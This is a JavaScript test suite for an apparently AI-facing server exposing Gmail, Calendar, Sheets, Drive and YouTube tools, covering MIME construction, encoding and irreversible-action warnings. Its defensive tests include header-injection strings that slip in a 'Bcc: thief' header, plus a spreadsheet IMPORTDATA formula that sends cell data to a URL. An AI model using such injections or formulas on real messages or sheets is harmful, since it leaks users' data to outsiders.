import test from 'node:test';
import assert from 'node:assert/strict';

import { buildRawMessage, encodeHeaderValue, registerGmailTools } from '../src/gmail.js';
import { registerDriveTools } from '../src/drive.js';
import { createEvent, deleteEvent, registerCalendarTools, updateEvent } from '../src/calendar.js';
import { registerSheetsTools, writeRange } from '../src/sheets.js';
import { registerYoutubeTools } from '../src/youtube.js';
import { REQUEST_TIMEOUT_MS, VERSION } from '../src/shared.js';

// Collects registerTool() calls without touching the network or credentials.
// getClient is never invoked at registration time, so a throwing stub is a
// useful assertion in itself: if registration ever starts eagerly authorizing,
// these tests fail loudly instead of silently reaching for real tokens.
function collectTools() {
  const tools = new Map();
  const server = {
    registerTool(name, config, handler) {
      tools.set(name, { name, config, handler });
    },
  };
  const getClient = () => {
    throw new Error('getClient must not be called during tool registration');
  };

  registerGmailTools(server, getClient);
  registerDriveTools(server, getClient);
  registerCalendarTools(server, getClient);
  registerSheetsTools(server, getClient);
  registerYoutubeTools(server, getClient);

  return tools;
}

function decode(raw) {
  return Buffer.from(raw, 'base64url').toString('utf-8');
}

/** The decoded content of every base64 text part, keyed by MIME type. */
function textParts(mime) {
  const parts = {};
  const re = /Content-Type: (text\/\w+); charset="UTF-8"\r\nContent-Transfer-Encoding: base64\r\n\r\n([A-Za-z0-9+/=\r\n]*?)(?=\r\n--|$)/g;
  for (const [, type, body] of mime.matchAll(re)) {
    parts[type] = Buffer.from(body.replace(/\r\n/g, ''), 'base64').toString('utf-8');
  }
  return parts;
}

/**
 * An auth client that answers every Google API request itself, recording it.
 * googleapis hands the fully built request to `auth.request()`, so this sees
 * exactly what would go over the wire, without a network or a token.
 */
function recordingAuth(data = {}) {
  const requests = [];
  return {
    requests,
    async request(options) {
      requests.push(options);
      return { data, status: 200, headers: {} };
    },
  };
}

test('every module registers its tools without needing credentials', () => {
  const tools = collectTools();
  assert.equal(tools.size, 23, `expected 23 tools, got ${tools.size}`);
});

test('tool names are unique and follow the <api>_<action> convention', () => {
  const tools = collectTools();
  const names = [...tools.keys()];

  assert.equal(new Set(names).size, names.length, 'duplicate tool name registered');

  for (const name of names) {
    assert.match(
      name,
      /^(gmail|drive|calendar|sheets|youtube)_[a-z0-9_]+$/,
      `"${name}" does not match <api>_<action>`
    );
  }
});

test('every tool declares a title, a description, and an input schema', () => {
  for (const { name, config } of collectTools().values()) {
    assert.ok(config.title?.trim(), `${name} is missing a title`);
    assert.ok(config.description?.trim(), `${name} is missing a description`);
    assert.ok(config.inputSchema, `${name} is missing an inputSchema`);
  }
});

// The tool description is the only thing the model reads before deciding to
// call a tool, so tools with irreversible external side effects must carry the
// warning in the description itself rather than relying on a confirmation layer.
test('irreversible tools warn about it in their descriptions', () => {
  const tools = collectTools();
  const irreversible = [
    'gmail_send_email',
    'calendar_create_event',
    'calendar_delete_event',
    'sheets_write_range',
  ];

  for (const name of irreversible) {
    const tool = tools.get(name);
    assert.ok(tool, `${name} is not registered`);
    assert.match(
      tool.config.description,
      /immediat|cannot be undone|no confirmation|overwrit|real send|permanent/i,
      `${name} does not warn that its effect is immediate or irreversible`
    );
  }
});

test('gmail_create_draft is described as the reviewable alternative', () => {
  const { config } = collectTools().get('gmail_create_draft');
  assert.match(config.description, /draft/i);
  assert.doesNotMatch(config.description, /cannot be undone/i);
});

test('plain-text message carries headers and a text/plain body', () => {
  const mime = decode(
    buildRawMessage({
      to: ['a@example.com'],
      subject: 'Hello',
      body: 'Plain body',
    })
  );

  assert.match(mime, /^To: a@example\.com\r\n/);
  assert.match(mime, /\r\nSubject: Hello\r\n/);
  assert.match(mime, /\r\nMIME-Version: 1\.0\r\n/);
  assert.match(mime, /Content-Type: text\/plain; charset="UTF-8"/);
  assert.equal(textParts(mime)['text/plain'], 'Plain body');
  assert.doesNotMatch(mime, /multipart/);
});

test('multiple recipients, cc and bcc are comma-joined into their own headers', () => {
  const mime = decode(
    buildRawMessage({
      to: ['a@example.com', 'b@example.com'],
      cc: ['c@example.com'],
      bcc: ['d@example.com'],
      subject: 'Many',
      body: 'x',
    })
  );

  assert.match(mime, /To: a@example\.com, b@example\.com/);
  assert.match(mime, /Cc: c@example\.com/);
  assert.match(mime, /Bcc: d@example\.com/);
});

test('cc and bcc headers are omitted entirely when not supplied', () => {
  const mime = decode(
    buildRawMessage({ to: ['a@example.com'], subject: 'S', body: 'x' })
  );

  assert.doesNotMatch(mime, /\r\nCc:/);
  assert.doesNotMatch(mime, /\r\nBcc:/);
});

test('supplying htmlBody produces a multipart/alternative with both parts', () => {
  const mime = decode(
    buildRawMessage({
      to: ['a@example.com'],
      subject: 'S',
      body: 'text version',
      htmlBody: '<p>html version</p>',
    })
  );

  const boundary = mime.match(/multipart\/alternative; boundary="([^"]+)"/)?.[1];
  assert.ok(boundary, 'no multipart/alternative boundary found');
  assert.deepEqual(textParts(mime), {
    'text/plain': 'text version',
    'text/html': '<p>html version</p>',
  });
  // Closing delimiter must be the boundary followed by a trailing "--".
  assert.ok(mime.includes(`--${boundary}--`), 'multipart/alternative is not closed');
});

test('attachments produce a closed multipart/mixed with base64 transfer encoding', () => {
  const content = Buffer.from('hello attachment').toString('base64');
  const mime = decode(
    buildRawMessage({
      to: ['a@example.com'],
      subject: 'S',
      body: 'see attached',
      attachments: [{ filename: 'note.txt', mimeType: 'text/plain', content }],
    })
  );

  const boundary = mime.match(/multipart\/mixed; boundary="([^"]+)"/)?.[1];
  assert.ok(boundary, 'no multipart/mixed boundary found');
  assert.match(mime, /Content-Disposition: attachment;\r\n filename="note\.txt"/);
  assert.match(mime, /Content-Transfer-Encoding: base64/);
  assert.match(mime, /Content-Type: text\/plain;\r\n name="note\.txt"/);
  assert.ok(mime.includes(`--${boundary}--`), 'multipart/mixed is not closed');
  assert.ok(mime.includes(content), 'attachment payload missing from message');
});

test('attachments fall back to sane defaults for filename and mimeType', () => {
  const mime = decode(
    buildRawMessage({
      to: ['a@example.com'],
      subject: 'S',
      body: 'x',
      attachments: [{ content: Buffer.from('data').toString('base64') }],
    })
  );

  assert.match(mime, /Content-Type: application\/octet-stream;\r\n name="attachment"/);
  assert.match(mime, /filename="attachment"/);
});

// Gmail rejects base64 payloads on excessively long lines, so the builder wraps
// them at 76 characters per RFC 2045.
test('long attachment payloads are wrapped at 76 characters', () => {
  const content = Buffer.from('x'.repeat(500)).toString('base64');
  const mime = decode(
    buildRawMessage({
      to: ['a@example.com'],
      subject: 'S',
      body: 'x',
      attachments: [{ filename: 'big.bin', content }],
    })
  );

  const payloadLines = mime
    .split('\r\n')
    .filter((line) => /^[A-Za-z0-9+/=]{20,}$/.test(line));

  assert.ok(payloadLines.length > 1, 'payload was not wrapped across lines');
  for (const line of payloadLines) {
    assert.ok(line.length <= 76, `line of ${line.length} chars exceeds the 76-char limit`);
  }
});

test('the encoded message is base64url — safe for the Gmail raw field', () => {
  const raw = buildRawMessage({
    to: ['a@example.com'],
    subject: 'Subject with + and / characters',
    body: '?'.repeat(40),
  });

  assert.doesNotMatch(raw, /[+/]/, 'raw contains standard-base64 characters');
  assert.match(raw, /^[A-Za-z0-9_-]+$/);
});

// ---------------------------------------------------------------------------
// Header injection. Every header value is interpolated into the message, so a
// line break in one would start a header of the caller's choosing.

test('a line break in the subject is refused, not sent as an extra header', () => {
  assert.throws(
    () => buildRawMessage({ to: ['a@example.com'], subject: 'Hi\r\nBcc: thief@example.com', body: 'x' }),
    /Subject must not contain line breaks/
  );
  assert.throws(
    () => buildRawMessage({ to: ['a@example.com'], subject: 'Hi\nBcc: thief@example.com', body: 'x' }),
    /line breaks/
  );
});

test('a line break in an address is refused even if schema validation was bypassed', () => {
  assert.throws(
    () => buildRawMessage({ to: ['a@example.com\r\nBcc: thief@example.com'], subject: 'S', body: 'x' }),
    /To must not contain line breaks/
  );
  assert.throws(
    () => buildRawMessage({ to: ['a@example.com'], cc: ['c@example.com\nX: y'], subject: 'S', body: 'x' }),
    /Cc must not contain line breaks/
  );
});

test('a line break in an attachment filename is refused', () => {
  assert.throws(
    () =>
      buildRawMessage({
        to: ['a@example.com'],
        subject: 'S',
        body: 'x',
        attachments: [{ filename: 'a.txt"\r\nBcc: thief@example.com', content: 'eA==' }],
      }),
    /filename must not contain line breaks/
  );
});

test('an attachment MIME type that is not a valid media type is refused', () => {
  for (const mimeType of ['text', 'text/plain; x="y\\"', 'text/plain; x', 'multipart/mixed', 'message/rfc822']) {
    assert.throws(
      () =>
        buildRawMessage({
          to: ['a@example.com'],
          subject: 'S',
          body: 'x',
          attachments: [{ filename: 'a.txt', mimeType, content: 'eA==' }],
        }),
      /invalid MIME type/,
      mimeType
    );
  }
});

test('an attachment MIME type may carry parameters', () => {
  const mime = decode(
    buildRawMessage({
      to: ['a@example.com'],
      subject: 'S',
      body: 'x',
      attachments: [{ filename: 'data.csv', mimeType: 'text/csv; charset=utf-8', content: 'eA==' }],
    })
  );
  assert.match(mime, /Content-Type: text\/csv; charset=utf-8;\r\n name="data\.csv"/);
});

// ---------------------------------------------------------------------------
// Encoding.

test('a non-ASCII subject is RFC 2047 encoded and decodes back exactly', () => {
  const subject = 'Café meeting — résumé attached ✓ '.repeat(3).trim();
  const encoded = encodeHeaderValue(subject);
  const words = encoded.split('\r\n ');

  assert.ok(words.length > 1, 'a long subject should fold into several encoded words');
  assert.ok(`Subject: ${words[0]}`.length <= 76, 'the first line exceeds 76 characters');
  let decoded = '';
  for (const word of words) {
    assert.ok(word.length <= 75, `encoded word of ${word.length} chars exceeds 75`);
    const [, payload] = word.match(/^=\?UTF-8\?B\?([A-Za-z0-9+/=]+)\?=$/) ?? [];
    assert.ok(payload, `not an encoded word: ${word}`);
    const chunk = Buffer.from(payload, 'base64').toString('utf-8');
    // A multi-byte character split across words would decode to U+FFFD here.
    assert.doesNotMatch(chunk, /�/, 'a character was split across encoded words');
    decoded += chunk;
  }
  assert.equal(decoded, subject);
});

test('a plain ASCII subject is left readable', () => {
  assert.equal(encodeHeaderValue('Quarterly report'), 'Quarterly report');
});

test('attachment filenames are quoted safely, and non-ASCII ones use RFC 2231', () => {
  const mime = decode(
    buildRawMessage({
      to: ['a@example.com'],
      subject: 'S',
      body: 'x',
      attachments: [
        { filename: 'say "hi".txt', content: 'eA==' },
        { filename: 'résumé.pdf', mimeType: 'application/pdf', content: 'eA==' },
      ],
    })
  );

  assert.match(mime, /filename="say \\"hi\\"\.txt"/);
  assert.match(mime, /filename\*0\*=UTF-8''r%C3%A9sum%C3%A9\.pdf/);
});

test('a long non-ASCII filename is split into RFC 2231 continuations that reassemble exactly', () => {
  const filename = `${'報告書'.repeat(40)}.pdf`;
  const mime = decode(
    buildRawMessage({ to: ['a@example.com'], subject: 'S', body: 'x', attachments: [{ filename, content: 'eA==' }] })
  );

  for (const line of mime.split('\r\n')) {
    assert.ok(line.length <= 78, `header line of ${line.length} chars: ${line.slice(0, 40)}…`);
  }
  const segments = [...mime.matchAll(/filename\*(\d+)\*=(?:UTF-8'')?([^;\r\n]+)/g)];
  assert.ok(segments.length > 1);
  assert.deepEqual(segments.map((m) => Number(m[1])), segments.map((_, i) => i));
  assert.equal(decodeURIComponent(segments.map((m) => m[2]).join('')), filename);
});

// SMTP caps a line at 998 octets, and generated HTML is often one long line.
test('a very long HTML line never produces a long line in the message', () => {
  const htmlBody = `<p>${'word '.repeat(2000)}</p>`;
  const mime = decode(buildRawMessage({ to: ['a@example.com'], subject: 'S', body: 'x', htmlBody }));

  for (const line of mime.split('\r\n')) {
    assert.ok(line.length <= 998, `line of ${line.length} chars exceeds the SMTP limit`);
  }
  assert.equal(textParts(mime)['text/html'], htmlBody);
});

test('attachment content is accepted with line breaks, URL-safe alphabet or no padding', () => {
  const bytes = Buffer.from([0xfb, 0xff, 0xbf, 0x00, 0x41]);
  const canonical = bytes.toString('base64'); // "+/+/AEE="
  for (const variant of [canonical, bytes.toString('base64url'), `${canonical.slice(0, 4)}\n${canonical.slice(4)}`]) {
    const mime = decode(
      buildRawMessage({ to: ['a@example.com'], subject: 'S', body: 'x', attachments: [{ filename: 'b.bin', content: variant }] })
    );
    assert.ok(mime.includes(`\r\n\r\n${canonical}\r\n`), `variant ${JSON.stringify(variant)} was not normalised`);
  }
});

test('attachment content that is not base64 is refused rather than sent corrupt', () => {
  assert.throws(
    () =>
      buildRawMessage({
        to: ['a@example.com'],
        subject: 'S',
        body: 'x',
        attachments: [{ filename: 'notes.txt', content: 'this is plain text, not base64!' }],
      }),
    /"notes\.txt" content is not valid base64/
  );
});

test('plain text made of base64 characters, and impossible padding, are refused too', () => {
  for (const content of ['Quarterly report draft', 'Hello world', 'see you at 10am', 'QUJDR==', 'A=', 'eA=']) {
    assert.throws(
      () =>
        buildRawMessage({ to: ['a@example.com'], subject: 'S', body: 'x', attachments: [{ filename: 'n.txt', content }] }),
      /not valid base64/,
      content
    );
  }
});

test('MIME boundaries are random per message', () => {
  const boundary = () =>
    decode(buildRawMessage({ to: ['a@example.com'], subject: 'S', body: 'x', htmlBody: '<p>x</p>' })).match(
      /boundary="([^"]+)"/
    )[1];
  assert.notEqual(boundary(), boundary());
});

// ---------------------------------------------------------------------------
// What actually goes to Google.

test('creating an event emails attendees by default, as the description promises', async () => {
  const auth = recordingAuth({ id: 'e1', summary: 'Lunch' });
  await createEvent(auth, {
    summary: 'Lunch',
    start: { dateTime: '2026-11-01T12:00:00Z' },
    end: { dateTime: '2026-11-01T13:00:00Z' },
    attendees: ['alice@example.com'],
  });

  const [req] = auth.requests;
  assert.equal(req.method, 'POST');
  assert.match(req.url, /\/calendars\/primary\/events$/);
  assert.equal(req.params.sendUpdates, 'all');
  assert.deepEqual(req.data.attendees, [{ email: 'alice@example.com' }]);

  const { config } = collectTools().get('calendar_create_event');
  assert.match(config.description, /emails an invitation/);
});

test('update and delete notify attendees by default, and the caller can opt out', async () => {
  const auth = recordingAuth({ id: 'e1' });
  await updateEvent(auth, { eventId: 'e1', updates: { summary: 'Moved' } });
  await deleteEvent(auth, { eventId: 'e1' });
  await deleteEvent(auth, { eventId: 'e1', sendUpdates: 'none' });

  assert.deepEqual(
    auth.requests.map((r) => [r.method, r.params.sendUpdates]),
    [
      ['PATCH', 'all'],
      ['DELETE', 'all'],
      ['DELETE', 'none'],
    ]
  );
});

// USER_ENTERED evaluates "=IMPORTDATA(...)" as a live formula that can send the
// sheet to any URL, so formula parsing must be asked for explicitly.
test('sheet writes store values RAW unless the caller opts into USER_ENTERED', async () => {
  const auth = recordingAuth({ updatedCells: 1, updatedRange: 'Sheet1!A1' });
  const values = [['=IMPORTDATA("https://example.com/?"&A2)']];
  await writeRange(auth, { spreadsheetId: 'sheet', range: 'Sheet1!A1', values });
  await writeRange(auth, { spreadsheetId: 'sheet', range: 'Sheet1!A1', values, valueInputOption: 'USER_ENTERED' });

  assert.deepEqual(
    auth.requests.map((r) => r.params.valueInputOption),
    ['RAW', 'USER_ENTERED']
  );
});

test('every Google API request carries a timeout', async () => {
  const auth = recordingAuth({ id: 'x', updatedCells: 0 });
  await createEvent(auth, { summary: 'S', start: { date: '2026-11-01' }, end: { date: '2026-11-02' } });
  await writeRange(auth, { spreadsheetId: 's', range: 'A1', values: [['x']] });

  for (const req of auth.requests) {
    assert.equal(req.timeout, REQUEST_TIMEOUT_MS, `${req.url} has no timeout`);
  }
});

test('youtube_get_channel explains its selector rule instead of forwarding a bare 400', async () => {
  const { handler } = collectTools().get('youtube_get_channel');
  await assert.rejects(() => handler({}), /exactly one of channelId, handle, or mine/);
  await assert.rejects(() => handler({ channelId: 'UCx', handle: '@x' }), /exactly one/);
});

test('the server reports the version in package.json', async () => {
  const { readFile } = await import('node:fs/promises');
  const pkg = JSON.parse(await readFile(new URL('../package.json', import.meta.url), 'utf8'));
  assert.equal(VERSION, pkg.version);
});
